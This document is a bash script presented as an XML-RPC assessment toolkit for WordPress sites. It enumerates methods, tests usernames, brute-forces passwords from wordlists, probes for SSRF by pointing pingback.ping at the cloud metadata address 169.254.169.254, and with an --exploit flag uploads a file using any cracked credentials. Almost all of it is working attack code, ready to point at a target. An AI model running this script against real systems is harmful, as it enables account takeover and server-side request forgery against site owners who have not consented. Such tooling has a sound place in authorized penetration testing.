#!/bin/bash

# -------------------------------
# XML-RPC Assessment Toolkit v2
# Author: [Your Name]
# Purpose: Modern, modular, and robust XML-RPC vulnerability assessment
# -------------------------------

set -euo pipefail
shopt -s lastpipe

# Color output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Output directory
OUTPUT_DIR="xmlrpc2_results"
LOG_FILE="$OUTPUT_DIR/scan.log"
JSON_SUMMARY="$OUTPUT_DIR/summary.json"
mkdir -p "$OUTPUT_DIR"

# Default config
TARGET=""
USER_FILE="userlist.txt"
PASS_FILE="passlist.txt"
EXPLOIT=0
DEBUG=0

# Associative arrays for results
declare -A SUMMARY

# Usage/help
usage() {
    echo -e "${BLUE}Usage:${NC} $0 -t <target> [-u userlist] [-p passlist] [--exploit] [--debug]"
    echo -e "\nOptions:"
    echo "  -t, --target     Target URL (required)"
    echo "  -u, --users      User list file (default: userlist.txt)"
    echo "  -p, --passes     Password list file (default: passlist.txt)"
    echo "      --exploit    Enable post-exploitation actions (default: off)"
    echo "      --debug      Enable debug output"
    echo "  -h, --help       Show this help message"
    exit 1
}

# Parse arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        -t|--target) TARGET="$2"; shift 2;;
        -u|--users) USER_FILE="$2"; shift 2;;
        -p|--passes) PASS_FILE="$2"; shift 2;;
        --exploit) EXPLOIT=1; shift;;
        --debug) DEBUG=1; shift;;
        -h|--help) usage;;
        *) echo -e "${RED}[!] Unknown option: $1${NC}"; usage;;
    esac
done

if [[ -z "$TARGET" ]]; then
    echo -e "${RED}[!] Target is required.${NC}"; usage
fi

XMLRPC="$TARGET/xmlrpc.php"
RSD="$TARGET/xmlrpc.php?rsd"
COOKIE_JAR="$OUTPUT_DIR/cookies.txt"
SSRF_TEST_URL="http://169.254.169.254/latest/meta-data/"

# Logging
log() {
    echo -e "[$(date +'%T')] $1" | tee -a "$LOG_FILE"
}
debug() {
    [[ $DEBUG -eq 1 ]] && echo -e "${YELLOW}[DEBUG] $1${NC}" | tee -a "$LOG_FILE"
}

# Send XML-RPC request
send_xml() {
    local xml_data="$1"
    local out_file="$2"
    debug "Sending XML-RPC request: $xml_data"
    curl -s -k -L -X POST "$XMLRPC" \
        -H 'Content-Type: text/xml' \
        -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
        --data "$xml_data" \
        --output "$out_file" \
        --connect-timeout 15 --max-time 25
    debug "Response saved to $out_file"
}

# 1. Discovery
check_rsd() {
    log "Checking for RSD document..."
    curl -s -k -o "$OUTPUT_DIR/rsd.xml" "$RSD"
    if grep -q 'apis' "$OUTPUT_DIR/rsd.xml"; then
        log "${GREEN}[+] RSD found${NC}"
        SUMMARY[rsd]="found"
    else
        log "${YELLOW}[-] RSD not found${NC}"
        SUMMARY[rsd]="not_found"
    fi
}

# 2. Service detection
check_xmlrpc() {
    log "Testing XML-RPC endpoint..."
    local response_file="$OUTPUT_DIR/xmlrpc_head_response.txt"
    local status
    # Try HEAD first
    curl -s -k -D "$response_file" -o /dev/null -X HEAD "$XMLRPC"
    status=$(grep -m1 -oE 'HTTP/[0-9.]+ [0-9]+' "$response_file" | awk '{print $2}')
    if [[ -z "$status" || "$status" == "000" ]]; then
        # Try GET if HEAD fails
        curl -s -k -D "$response_file" -o /dev/null -X GET "$XMLRPC"
        status=$(grep -m1 -oE 'HTTP/[0-9.]+ [0-9]+' "$response_file" | awk '{print $2}')
    fi
    log "[i] HTTP response headers for $XMLRPC:" && cat "$response_file" | tee -a "$LOG_FILE"
    if [[ "$status" == "200" ]]; then
        log "${GREEN}[+] XML-RPC endpoint found (HTTP 200)${NC}"
        SUMMARY[xmlrpc]="found"
    elif [[ "$status" =~ ^(401|403|405|301|302)$ ]]; then
        log "${YELLOW}[?] XML-RPC endpoint returned HTTP $status (may be present but protected or redirected)${NC}"
        SUMMARY[xmlrpc]="maybe_found"
    else
        log "${RED}[!] XML-RPC endpoint not found (HTTP $status)${NC}"
        SUMMARY[xmlrpc]="not_found"
        log "[!] Stopping further tests due to endpoint not found."
        exit 1
    fi
}

# 3. Method enumeration
enumerate_methods() {
    log "Enumerating XML-RPC methods..."
    local xml='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params/></methodCall>'
    local out="$OUTPUT_DIR/methods.xml"
    local log_raw="$OUTPUT_DIR/methods_raw.log"
    send_xml "$xml" "$out"
    cp "$out" "$log_raw"
    log "[i] Raw system.listMethods response saved to $log_raw"
    if grep -q '<methodResponse>' "$out"; then
        if grep -q '<fault>' "$out"; then
            log "${YELLOW}[!] Fault returned by system.listMethods. Trying alternative enumeration...${NC}"
            # Try system.methodHelp as a fallback
            local alt_methods=("system.methodHelp" "system.methodSignature")
            for alt in "${alt_methods[@]}"; do
                local alt_xml="<?xml version=\"1.0\"?><methodCall><methodName>$alt</methodName><params><param><value><string>system.listMethods</string></value></param></params></methodCall>"
                local alt_out="$OUTPUT_DIR/${alt}_response.xml"
                send_xml "$alt_xml" "$alt_out"
                log "[i] $alt response saved to $alt_out"
                if grep -q '<methodResponse>' "$alt_out" && ! grep -q '<fault>' "$alt_out"; then
                    log "${GREEN}[+] $alt succeeded. See $alt_out${NC}"
                fi
            done
            SUMMARY[methods]="fault"
        else
            if command -v xmllint >/dev/null 2>&1; then
                xmllint --xpath "//string/text()" "$out" 2>/dev/null | tr ' ' '\n' | sort | uniq | tee "$OUTPUT_DIR/methods.txt"
            else
                grep -Eo '<string>[^<]+</string>' "$out" | sed 's/<string>//;s/<\/string>//' | sort | uniq | tee "$OUTPUT_DIR/methods.txt"
            fi
            log "${GREEN}[+] Methods enumerated. See $OUTPUT_DIR/methods.txt${NC}"
            SUMMARY[methods]="$(paste -sd, "$OUTPUT_DIR/methods.txt")"
        fi
    else
        log "${RED}[-] Method enumeration failed: no <methodResponse> in reply${NC}"
        SUMMARY[methods]="none"
    fi
}

# 4. Username check (parallel)
check_users() {
    log "Checking usernames (parallel)..."
    local xml
    local out
    local valid_users=()
    > "$OUTPUT_DIR/valid_users.txt"
    while IFS= read -r user; do
        xml="<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>$user</string></value></param><param><value><string>invalid</string></value></param></params></methodCall>"
        out="$OUTPUT_DIR/user_${user// /_}.xml"
        send_xml "$xml" "$out" &
    done < "$USER_FILE"
    wait
    for f in $OUTPUT_DIR/user_*.xml; do
        if grep -q 'faultCode' "$f" && ! grep -q 'Incorrect username' "$f"; then
            local u=$(basename "$f" | sed 's/user_//;s/\.xml//')
            log "${GREEN}[+] Valid user: $u${NC}"
            echo "$u" >> "$OUTPUT_DIR/valid_users.txt"
        fi
    done
    SUMMARY[users]="$(paste -sd, "$OUTPUT_DIR/valid_users.txt" 2>/dev/null || echo none)"
}

# 5. Password brute (smarter: stop on first success per user)
brute_passwords() {
    log "Bruteforcing passwords..."
    > "$OUTPUT_DIR/valid_credentials.txt"
    local found=0
    while IFS= read -r user; do
        while IFS= read -r pass; do
            xml="<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>$user</string></value></param><param><value><string>$pass</string></value></param></params></methodCall>"
            out="$OUTPUT_DIR/pass_${user// /_}_${pass// /_}.xml"
            send_xml "$xml" "$out"
            if grep -q 'isAdmin' "$out"; then
                log "${GREEN}[!] SUCCESS: $user:$pass${NC}"
                echo "$user:$pass" >> "$OUTPUT_DIR/valid_credentials.txt"
                found=1
                break
            fi
        done < "$PASS_FILE"
    done < "$OUTPUT_DIR/valid_users.txt"
    if [[ $found -eq 0 ]]; then
        log "${YELLOW}[-] No valid credentials found${NC}"
        SUMMARY[credentials]="none"
    else
        SUMMARY[credentials]="$(paste -sd, "$OUTPUT_DIR/valid_credentials.txt")"
    fi
}

# 6. SSRF test
ssrf_test() {
    log "Testing for SSRF via pingback..."
    local xml="<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>$SSRF_TEST_URL</string></value></param><param><value><string>$XMLRPC</string></value></param></params></methodCall>"
    local out="$OUTPUT_DIR/pingback_test.xml"
    send_xml "$xml" "$out"
    if grep -q 'faultCode' "$out"; then
        log "${YELLOW}[-] SSRF not confirmed (fault returned)${NC}"
        SUMMARY[ssrf]="not_confirmed"
    else
        log "${RED}[!] Possible SSRF vulnerability detected${NC}"
        SUMMARY[ssrf]="possible"
    fi
}

# 7. Code execution test
code_exec_test() {
    log "Testing for code execution..."
    local xml='<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>phpinfo</string></value></member></struct></value></data></array></value></param></params></methodCall>'
    local out="$OUTPUT_DIR/exec_test.xml"
    send_xml "$xml" "$out"
    if grep -q 'PHP Version' "$out"; then
        log "${RED}[!] Code execution vulnerability confirmed${NC}"
        SUMMARY[code_exec]="confirmed"
    else
        log "${GREEN}[-] No code execution via standard methods${NC}"
        SUMMARY[code_exec]="none"
    fi
}

# 8. Post-exploitation (optional)
post_exploit() {
    if [[ $EXPLOIT -eq 1 && -s "$OUTPUT_DIR/valid_credentials.txt" ]]; then
        log "Attempting post-exploitation actions..."
        read -r user pass < "$OUTPUT_DIR/valid_credentials.txt"
        local xml="<?xml version=\"1.0\"?><methodCall><methodName>wp.uploadFile</methodName><params><param><value><int>1</int></value></param><param><value><string>$user</string></value></param><param><value><string>$pass</string></value></param><param><value><struct><member><name>name</name><value><string>test2.txt</string></value></member><member><name>type</name><value><string>text/plain</string></value></member><member><name>bits</name><value><base64>$(echo 'Proof-of-Concept-2' | base64)</base64></value></member><member><name>overwrite</name><value><boolean>1</boolean></value></member></struct></value></param></params></methodCall>"
        local out="$OUTPUT_DIR/upload_test.xml"
        send_xml "$xml" "$out"
        if grep -q 'uploadFile' "$out"; then
            log "${RED}[!] Successful file upload: $TARGET/wp-content/uploads/test2.txt${NC}"
            SUMMARY[post_exploit]="file_uploaded"
        else
            log "${YELLOW}[-] File upload failed${NC}"
            SUMMARY[post_exploit]="upload_failed"
        fi
    else
        log "${YELLOW}[-] Post-exploitation skipped (no creds or not enabled)${NC}"
        SUMMARY[post_exploit]="skipped"
    fi
}

# Main logic
main() {
    log "${BLUE}Starting XML-RPC v2 assessment for $TARGET${NC}"
    check_rsd
    check_xmlrpc
    enumerate_methods
    check_users
    brute_passwords
    ssrf_test
    code_exec_test
    post_exploit
    log "${BLUE}Scan completed. See $OUTPUT_DIR for details.${NC}"
    # Write JSON summary
    echo '{' > "$JSON_SUMMARY"
    for k in "${!SUMMARY[@]}"; do
        echo "  \"$k\": \"${SUMMARY[$k]}\"," >> "$JSON_SUMMARY"
    done
    sed -i '$ s/,$//' "$JSON_SUMMARY"
    echo '}' >> "$JSON_SUMMARY"
    log "${GREEN}Summary written to $JSON_SUMMARY${NC}"
}

main
